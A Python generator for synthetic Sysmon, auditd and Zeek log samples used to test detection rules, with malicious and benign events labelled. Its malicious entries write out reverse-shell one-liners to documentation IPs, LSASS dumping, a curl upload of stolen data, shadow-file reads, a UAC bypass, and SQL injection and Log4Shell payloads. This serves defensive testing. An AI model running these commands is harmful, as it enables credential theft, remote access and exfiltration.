#!/usr/bin/env python3
"""Generate the SYNTHETIC sample logs used to test the detection rules.

    *** All events produced here are SYNTHETIC. They were written by hand to resemble ***
    *** Sysmon, auditd and Zeek output; they were not captured from any real system.  ***

Every event carries three bookkeeping fields that the test harness uses and that real
telemetry does not have:

    _sample_id  unique ID referenced from mapping/detections.yml
    _label      malicious | benign | context
                  malicious - produced by an attack; at least one rule must fire on it
                  benign    - normal activity; no rule may fire unless the mapping lists
                              it as a known false positive
                  context   - supporting records (e.g. auditd SYSCALL / PARENT records);
                              not scored
    _note       one-line human explanation

Field names follow the Sigma taxonomy (flattened Sysmon EventData, raw auditd keys, Zeek
JSON log fields), i.e. the shape Zircolite / evtx_dump produce after flattening. IP
addresses use lab RFC 1918 ranges for internal hosts and the RFC 5737 documentation
ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) for "attacker" hosts, so none of
them belongs to a real third party.

Run:  python sample-logs/generate_samples.py   (rewrites the *.jsonl files deterministically)
"""

from __future__ import annotations

import json
from pathlib import Path

HERE = Path(__file__).resolve().parent
SYSMON_CHANNEL = "Microsoft-Windows-Sysmon/Operational"
WIN_HOST = "WIN10-LAB01.securenet.lab"
LNX_HOST = "ubuntu-web01"


def win(sample_id, label, note, event_id, utc, **fields):
    return {
        "_sample_id": sample_id,
        "_label": label,
        "_note": note,
        "EventID": event_id,
        "Channel": SYSMON_CHANNEL,
        "Computer": WIN_HOST,
        "UtcTime": utc,
        **fields,
    }


def proc(sample_id, label, note, utc, image, cmd, parent, parent_cmd, user="SECURENET\\alice", **extra):
    return win(
        sample_id, label, note, 1, utc,
        Image=image, CommandLine=cmd, ParentImage=parent, ParentCommandLine=parent_cmd,
        OriginalFileName=Path(image.replace("\\", "/")).name.upper()
        if image.lower().endswith(".exe") else "",
        User=user, IntegrityLevel="Medium", **extra,
    )


WINDOWS = [
    # ---------------------------- malicious ----------------------------
    proc("win-001", "malicious", "Word document macro starts cmd.exe which launches PowerShell",
         "2026-10-29 09:14:02.113",
         "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
         "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\alice\\Downloads\\Invoice_4471.docm\""),
    proc("win-002", "malicious", "PowerShell with Base64 -enc payload (child of win-001)",
         "2026-10-29 09:14:02.468",
         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
         "C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
    proc("win-003", "malicious", "Scheduled task running a binary from C:\\Users\\Public as SYSTEM",
         "2026-10-29 09:16:40.002",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks.exe /create /tn \"OneDriveUpdate\" /tr \"C:\\Users\\Public\\odupdate.exe\" /sc onlogon /ru SYSTEM /f",
         "C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
    win("win-004", "malicious", "HKCU Run key pointing to a binary in the user's Temp folder", 13,
        "2026-10-29 09:17:11.950",
        EventType="SetValue",
        Image="C:\\Windows\\System32\\reg.exe",
        TargetObject="HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSvcHost",
        Details="C:\\Users\\alice\\AppData\\Local\\Temp\\svchost32.exe",
        User="SECURENET\\alice"),
    proc("win-005", "malicious", "sc.exe creates an auto-start service from ProgramData",
         "2026-10-29 09:18:30.774",
         "C:\\Windows\\System32\\sc.exe",
         "sc.exe create UpdaterSvc binPath= \"C:\\ProgramData\\updater\\upd.exe\" start= auto",
         "C:\\Windows\\System32\\cmd.exe", "cmd.exe", user="SECURENET\\admin.alice"),
    win("win-006", "malicious", "fodhelper UAC bypass: ms-settings open command written in HKCU", 13,
        "2026-10-29 09:19:05.331",
        EventType="SetValue",
        Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        TargetObject="HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
        Details="C:\\Windows\\System32\\cmd.exe /c start C:\\Users\\Public\\odupdate.exe",
        User="SECURENET\\alice"),
    win("win-007", "malicious", "procdump64 from Downloads opens LSASS with PROCESS_ALL_ACCESS", 10,
        "2026-10-29 09:21:44.120",
        SourceImage="C:\\Users\\alice\\Downloads\\procdump64.exe",
        TargetImage="C:\\Windows\\system32\\lsass.exe",
        GrantedAccess="0x1fffff",
        CallTrace="C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Users\\alice\\Downloads\\procdump64.exe+3a2f1",
        SourceUser="SECURENET\\admin.alice"),
    proc("win-008", "malicious", "rundll32 comsvcs.dll MiniDump of LSASS (PID 664)",
         "2026-10-29 09:22:10.501",
         "C:\\Windows\\System32\\rundll32.exe",
         "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 664 C:\\Windows\\Temp\\lsass.dmp full",
         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe",
         user="SECURENET\\admin.alice"),
    win("win-009", "malicious", "The rundll32 from win-008 opening LSASS (Sysmon EID 10)", 10,
        "2026-10-29 09:22:10.533",
        SourceImage="C:\\Windows\\System32\\rundll32.exe",
        TargetImage="C:\\Windows\\system32\\lsass.exe",
        GrantedAccess="0x1fffff",
        CallTrace="C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\comsvcs.dll+2a1c3",
        SourceUser="SECURENET\\admin.alice"),
    proc("win-010", "malicious", "Command executed remotely through the PsExec service",
         "2026-10-29 09:30:55.010",
         "C:\\Windows\\System32\\cmd.exe", "\"cmd\" /c ipconfig /all",
         "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", user="SECURENET\\admin.alice"),
    proc("win-011", "malicious", "whoami executed inside a WinRM / PowerShell Remoting session",
         "2026-10-29 09:33:12.400",
         "C:\\Windows\\System32\\whoami.exe", "\"C:\\Windows\\system32\\whoami.exe\" /all",
         "C:\\Windows\\System32\\wsmprovhost.exe",
         "C:\\Windows\\system32\\wsmprovhost.exe -Embedding", user="SECURENET\\admin.alice"),
    # ---------------------------- benign ----------------------------
    proc("win-101", "benign", "Word starting the print spooler helper when printing",
         "2026-10-29 08:02:11.000",
         "C:\\Windows\\splwow64.exe", "C:\\Windows\\splwow64.exe 12288",
         "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\bob\\Documents\\Report.docx\""),
    proc("win-102", "benign", "Admin backup script: PowerShell with -ExecutionPolicy and -File (no encoding)",
         "2026-10-29 02:00:00.000",
         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
         "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
         user="NT AUTHORITY\\SYSTEM"),
    proc("win-103", "benign", "Browser updater registering its task under Program Files",
         "2026-10-29 08:10:30.000",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks.exe /create /tn \"GoogleUpdateTaskMachineUA\" /tr \"'C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe' /ua /installsource scheduler\" /sc hourly /f",
         "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe", "GoogleUpdate.exe /install",
         user="NT AUTHORITY\\SYSTEM"),
    win("win-104", "benign", "OneDrive per-user Run key (AppData\\Local, not Temp)", 13,
        "2026-10-29 08:11:02.000",
        EventType="SetValue",
        Image="C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
        TargetObject="HKU\\S-1-5-21-3623811015-3361044348-30300820-1014\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
        Details="\"C:\\Users\\bob\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
        User="SECURENET\\bob"),
    win("win-105", "benign", "Microsoft Defender scanning LSASS", 10,
        "2026-10-29 08:15:00.000",
        SourceImage="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
        TargetImage="C:\\Windows\\system32\\lsass.exe",
        GrantedAccess="0x1410",
        CallTrace="C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\mpengine.dll+5b1c0",
        SourceUser="NT AUTHORITY\\SYSTEM"),
    proc("win-106", "benign", "Console host created for a remoting session",
         "2026-10-29 08:20:00.000",
         "C:\\Windows\\System32\\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
         "C:\\Windows\\System32\\wsmprovhost.exe", "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
         user="SECURENET\\admin.bob"),
    proc("win-107", "benign", "Service status query",
         "2026-10-29 08:21:00.000",
         "C:\\Windows\\System32\\sc.exe", "sc.exe query wuauserv",
         "C:\\Windows\\System32\\cmd.exe", "cmd.exe", user="SECURENET\\admin.bob"),
    proc("win-108", "benign", "Control panel applet via rundll32",
         "2026-10-29 08:22:00.000",
         "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
         "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", user="SECURENET\\bob"),
]


def lnx(sample_id, label, note, utc, image, cmd, parent, parent_cmd, user="www-data"):
    # Sysmon for Linux, EventID 1 (process creation), EventData flattened.
    return {
        "_sample_id": sample_id, "_label": label, "_note": note,
        "EventID": 1, "Computer": LNX_HOST, "UtcTime": utc,
        "Image": image, "CommandLine": cmd, "ParentImage": parent,
        "ParentCommandLine": parent_cmd, "User": user, "CurrentDirectory": "/",
    }


LINUX_PROC = [
    lnx("lnx-001", "malicious", "Apache worker spawning sh to run recon commands (web shell)",
        "2026-10-29 10:02:13.441", "/usr/bin/sh", "sh -c id; uname -a",
        "/usr/sbin/apache2", "/usr/sbin/apache2 -k start"),
    lnx("lnx-002", "malicious", "Bash reverse shell to a TEST-NET address",
        "2026-10-29 10:02:40.010", "/usr/bin/bash",
        "bash -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1", "/usr/bin/sh", "sh -c id; uname -a"),
    lnx("lnx-003", "malicious", "Setuid bit set on a copied shell in /tmp",
        "2026-10-29 10:05:02.000", "/usr/bin/chmod", "chmod u+s /tmp/.rootbash",
        "/usr/bin/bash", "bash -i", user="root"),
    lnx("lnx-004", "malicious", "Reading password hashes from /etc/shadow",
        "2026-10-29 10:05:30.120", "/usr/bin/cat", "cat /etc/shadow",
        "/usr/bin/bash", "bash -i", user="root"),
    lnx("lnx-005", "malicious", "curl form upload of an archive to an external host",
        "2026-10-29 10:07:12.900", "/usr/bin/curl",
        "curl -s -X POST -F file=@/tmp/loot.tar.gz http://198.51.100.20:8000/upload",
        "/usr/bin/bash", "bash -i", user="root"),
    lnx("lnx-006", "malicious", "Python socket + pty.spawn reverse shell",
        "2026-10-29 10:03:01.555", "/usr/bin/python3",
        "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"203.0.113.50\",4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "import pty;pty.spawn(\"/bin/sh\")",
        "/usr/bin/bash", "bash -i"),
    # ---------------------------- benign ----------------------------
    lnx("lnx-101", "benign", "nginx master starting a worker process",
        "2026-10-29 07:00:00.000", "/usr/sbin/nginx", "nginx: worker process",
        "/usr/sbin/nginx", "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;",
        user="root"),
    lnx("lnx-102", "benign", "Container health check probing local PostgreSQL via /dev/tcp",
        "2026-10-29 07:01:00.000", "/usr/bin/bash", "bash -c echo > /dev/tcp/127.0.0.1/5432",
        "/usr/bin/containerd-shim-runc-v2", "/usr/bin/containerd-shim-runc-v2 -namespace moby",
        user="root"),
    lnx("lnx-103", "benign", "Making a deployment script executable",
        "2026-10-29 07:02:00.000", "/usr/bin/chmod", "chmod 755 /usr/local/bin/backup.sh",
        "/usr/bin/bash", "bash", user="root"),
    lnx("lnx-104", "benign", "sudo package postinst re-applying the setuid bit",
        "2026-10-29 07:03:00.000", "/usr/bin/chmod", "chmod 4755 /usr/bin/sudo",
        "/usr/bin/sh", "/bin/sh /var/lib/dpkg/info/sudo.postinst configure 1.9.9-1ubuntu2.4",
        user="root"),
    lnx("lnx-105", "benign", "Downloading a repository signing key with curl",
        "2026-10-29 07:04:00.000", "/usr/bin/curl",
        "curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /tmp/docker.gpg",
        "/usr/bin/bash", "bash", user="root"),
    lnx("lnx-106", "benign", "Reading /etc/passwd (world-readable, not credentials)",
        "2026-10-29 07:05:00.000", "/usr/bin/grep", "grep alice /etc/passwd",
        "/usr/bin/bash", "bash", user="alice"),
    lnx("lnx-107", "benign", "PHP-FPM calling ImageMagick to create a thumbnail",
        "2026-10-29 07:06:00.000", "/usr/bin/convert",
        "convert /var/www/uploads/p1.jpg -resize 200x200 /var/www/uploads/t_p1.jpg",
        "/usr/sbin/php-fpm8.1", "php-fpm: pool www"),
]


def audit(sample_id, label, note, serial, rtype, **fields):
    return {
        "_sample_id": sample_id, "_label": label, "_note": note,
        "type": rtype, "msg": f"audit(1793264400.{serial % 1000:03d}:{serial})",
        "node": LNX_HOST, **fields,
    }


AUDITD = [
    # cron persistence: one audit event = SYSCALL + PARENT path record + CREATE path record
    audit("aud-001", "context", "SYSCALL record of the cron drop (carries the audit key)", 4521,
          "SYSCALL", syscall="openat", success="yes", exe="/usr/bin/bash", comm="bash",
          uid="0", auid="1000", key="cron_persistence"),
    audit("aud-002", "context", "PARENT path record (directory) - filtered by the rule", 4521,
          "PATH", item="0", name="/etc/cron.d/", nametype="PARENT", mode="040755"),
    audit("aud-003", "malicious", "New file /etc/cron.d/sysupdate created by attacker", 4521,
          "PATH", item="1", name="/etc/cron.d/sysupdate", nametype="CREATE", mode="0100644"),
    # authorized_keys persistence
    audit("aud-004", "malicious", "Attacker key appended to root's authorized_keys", 4533,
          "PATH", item="1", name="/root/.ssh/authorized_keys", nametype="NORMAL", mode="0100600"),
    audit("aud-005", "context", "PARENT record for /root/.ssh/", 4533,
          "PATH", item="0", name="/root/.ssh/", nametype="PARENT", mode="040700"),
    # ---------------------------- benign ----------------------------
    audit("aud-101", "benign", "Admin editing /etc/hosts", 4601,
          "PATH", item="0", name="/etc/hosts", nametype="NORMAL", mode="0100644"),
    audit("aud-102", "benign", "SSH client updating known_hosts", 4602,
          "PATH", item="0", name="/home/alice/.ssh/known_hosts", nametype="NORMAL", mode="0100644"),
    audit("aud-103", "benign", "Admin adding a user to cron.allow", 4603,
          "PATH", item="0", name="/etc/cron.allow", nametype="NORMAL", mode="0100644"),
    audit("aud-104", "benign", "dpkg installing logrotate's daily cron job (expected false positive)", 4604,
          "PATH", item="1", name="/etc/cron.daily/logrotate", nametype="CREATE", mode="0100755"),
]


def zeek_conn(uid, ts, orig, resp, resp_p, orig_p=51000):
    return {"ts": ts, "uid": uid, "id.orig_h": orig, "id.orig_p": orig_p,
            "id.resp_h": resp, "id.resp_p": resp_p}


def http(sample_id, label, note, uid, ts, orig, uri, status=200, ua="Mozilla/5.0 (X11; Linux x86_64)"):
    return {"_sample_id": sample_id, "_label": label, "_note": note,
            **zeek_conn(uid, ts, orig, "10.10.20.10", 80),
            "trans_depth": 1, "method": "GET", "host": "web01.securenet.lab", "uri": uri,
            "version": "1.1", "user_agent": ua, "status_code": status}


ZEEK_HTTP = [
    http("zk-http-001", "malicious", "Path traversal to /etc/passwd", "CHhAvVGS1DHFjwGM9",
         1793264512.112, "203.0.113.50", "/cgi-bin/../../../../etc/passwd", status=400,
         ua="curl/8.5.0"),
    http("zk-http-002", "malicious", "UNION SELECT SQL injection", "C4J4Th3PJpwUYZZ6gc",
         1793264520.874, "203.0.113.50",
         "/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", status=200,
         ua="sqlmap/1.8.4#stable (https://sqlmap.org)"),
    http("zk-http-003", "malicious", "Log4Shell JNDI lookup (URL-encoded)", "CtPZjS20MLrsMUOJi2",
         1793264531.004, "203.0.113.51",
         "/?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.51%3A1389%2Fa%7D", status=200),
    http("zk-http-101", "benign", "Normal page load", "CUM0KZ3MLUfNB0cl11",
         1793262000.000, "10.10.30.21", "/index.html"),
    http("zk-http-102", "benign", "Search query containing the words union and select",
         "CmES5u32sYpV7JYN", 1793262010.000, "10.10.30.21",
         "/search?q=how+to+select+a+union+representative"),
    http("zk-http-103", "benign", "Versioned static asset", "C3eiCBGOLw3VtHfOj",
         1793262020.000, "10.10.30.22", "/static/js/app.js?v=1.2.3"),
]


def ssh(sample_id, label, note, uid, ts, orig, attempts, success):
    return {"_sample_id": sample_id, "_label": label, "_note": note,
            **zeek_conn(uid, ts, orig, "10.10.20.10", 22),
            "version": 2, "auth_success": success, "auth_attempts": attempts,
            "direction": "INBOUND", "client": "SSH-2.0-OpenSSH_9.6p1",
            "server": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"}


ZEEK_SSH = [
    ssh("zk-ssh-001", "malicious", "Password guessing - 6 failed attempts in one connection",
        "CdfK4i2pXsMfXQXyk1", 1793264600.100, "203.0.113.50", 6, False),
    ssh("zk-ssh-002", "malicious", "Password guessing that succeeded on the 5th attempt",
        "Cx9tdl1Q2C9nq2BpRa", 1793264610.330, "203.0.113.50", 5, True),
    ssh("zk-ssh-101", "benign", "Admin key-based login", "CMdzit1AMNsmfAIiQc",
        1793262100.000, "10.10.30.21", 1, True),
    ssh("zk-ssh-102", "benign", "Admin mistyped password once", "C7XEbhP654jzLoe3a",
        1793262110.000, "10.10.30.22", 2, True),
]


def dns(sample_id, label, note, uid, ts, orig, query, qtype="A", rcode="NOERROR"):
    return {"_sample_id": sample_id, "_label": label, "_note": note,
            **zeek_conn(uid, ts, orig, "10.10.0.53", 53),
            "proto": "udp", "query": query, "qtype_name": qtype, "rcode_name": rcode}


ZEEK_DNS = [
    dns("zk-dns-001", "malicious", "Base32-encoded data chunk in subdomain (tunnel)",
        "CpjMvj2Cvj9MoJ2ZPd", 1793264700.010, "10.10.20.10",
        "MZXW6YTBOI5HI2LNMUQGC3TEEBTGS3DFEBRW63TUMVXHI4ZAMFXGI.t1.tunnel.example", "TXT"),
    dns("zk-dns-002", "malicious", "Next chunk of the same tunnel session",
        "CbYfV13NcUGHPhm9q3", 1793264700.420, "10.10.20.10",
        "ONSXEZLUEBSGC5DBEBTHE33NEB2GQZJAONSXE5TFOIQGS4ZAMNXX.t1.tunnel.example", "TXT"),
    dns("zk-dns-101", "benign", "Normal web lookup", "C1aGc63bBkUj2V0dkf",
        1793262200.000, "10.10.30.21", "www.example.com"),
    dns("zk-dns-102", "benign", "Sophos reputation lookup with a long hash label (filtered)",
        "CUoBPj2ERkSSY9iN5i", 1793262210.000, "10.10.30.21",
        "a3f5c9d1e2b4a6c8d0e1f2a3b4c5d6e7f8a9b0c1d2e3.sophosxl.net"),
    dns("zk-dns-103", "benign", "DMARC policy lookup", "CEi7Wy4Rv0k4DaTSUg",
        1793262220.000, "10.10.30.22", "_dmarc.example.org", "TXT"),
]

FILES = {
    "windows/sysmon.jsonl": WINDOWS,
    "linux/sysmon_linux_process_creation.jsonl": LINUX_PROC,
    "linux/auditd.jsonl": AUDITD,
    "zeek/http.jsonl": ZEEK_HTTP,
    "zeek/ssh.jsonl": ZEEK_SSH,
    "zeek/dns.jsonl": ZEEK_DNS,
}


def main() -> None:
    seen: set[str] = set()
    for rel, events in FILES.items():
        for ev in events:
            assert ev["_sample_id"] not in seen, ev["_sample_id"]
            seen.add(ev["_sample_id"])
        path = HERE / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8", newline="\n") as fh:
            for ev in events:
                fh.write(json.dumps(ev, ensure_ascii=False) + "\n")
        print(f"wrote {path.relative_to(HERE.parent)} ({len(events)} events)")


if __name__ == "__main__":
    main()
